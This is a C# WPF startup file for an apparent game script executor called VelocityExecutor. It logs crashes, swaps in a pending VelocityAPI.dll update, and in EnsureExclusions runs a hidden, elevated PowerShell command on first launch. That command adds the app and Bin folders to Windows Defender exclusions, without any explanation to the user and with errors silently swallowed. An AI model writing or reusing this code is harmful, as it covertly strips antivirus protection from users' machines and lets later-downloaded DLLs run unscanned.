using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Threading;

namespace VelocityExecutor;

public partial class App : Application
{
	protected override void OnStartup(StartupEventArgs e)
	{
		AppContext.SetSwitch("System.Net.DisableIPv6", isEnabled: true);
		base.OnStartup(e);
		ApplyPendingApiUpdate();
		MainWindow window = new MainWindow();
		window.Show();

		base.DispatcherUnhandledException += delegate(object s, DispatcherUnhandledExceptionEventArgs args)
		{
			LogCrash(args.Exception, "UI Thread Crash");
			args.Handled = true;
			ShowCrashMsg(args.Exception);
		};
		TaskScheduler.UnobservedTaskException += delegate(object? s, UnobservedTaskExceptionEventArgs args)
		{
			LogCrash(args.Exception, "Background Task Crash");
			args.SetObserved();
		};
		AppDomain.CurrentDomain.UnhandledException += delegate(object s, UnhandledExceptionEventArgs args)
		{
			LogCrash(args.ExceptionObject as Exception, "Critical Domain Crash");
			if (args.IsTerminating)
			{
				MessageBox.Show("Fatal Error >w<! The application is crashing hard.\nCheck crash_log.txt for details.", "Fatal Crash", MessageBoxButton.OK, MessageBoxImage.Hand);
			}
		};
		EnsureExclusions();
	}

	private void EnsureExclusions()
	{
		try
		{
			string currentDir = AppDomain.CurrentDomain.BaseDirectory;
			string flagFile = Path.Combine(currentDir, ".exclusions_added");
			if (File.Exists(flagFile)) return;
			
			string binDir = Path.Combine(currentDir, "Bin");
			string script = $"Add-MpPreference -ExclusionPath '{currentDir}' -Force; Add-MpPreference -ExclusionPath '{binDir}' -Force";
			if (Directory.Exists(binDir))
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "powershell",
					Arguments = "-NoProfile -WindowStyle Hidden -Command \"" + script + "\"",
					UseShellExecute = true,
					Verb = "runas"
				});
				File.WriteAllText(flagFile, DateTime.Now.ToString());
			}
		}
		catch
		{
		}
	}

	private void LogCrash(Exception? ex, string source)
	{
		try
		{
			string log = $"[{DateTime.Now}] [{source}] ERROR:\n{ex}\n----------------------------------\n";
			File.AppendAllText("crash_log.txt", log);
		}
		catch
		{
		}
	}

	private void ShowCrashMsg(Exception ex)
	{
		MessageBox.Show("Oopsie! An unexpected error occurred >w<\n\nError: " + ex.Message + "\n\nDetails saved to crash_log.txt", "App Crash D:", MessageBoxButton.OK, MessageBoxImage.Hand);
	}

	private void ApplyPendingApiUpdate()
	{
		try
		{
			string exeDir = AppDomain.CurrentDomain.BaseDirectory;
			string dllPath = Path.Combine(exeDir, "VelocityAPI.dll");
			string updatePath = dllPath + ".update";

			if (File.Exists(updatePath))
			{
				if (File.Exists(dllPath)) File.Delete(dllPath);
				File.Move(updatePath, dllPath);
			}
		}
		catch (Exception ex)
		{
			LogCrash(ex, "VelocityAPI Update Apply Failed");
		}
	}
}
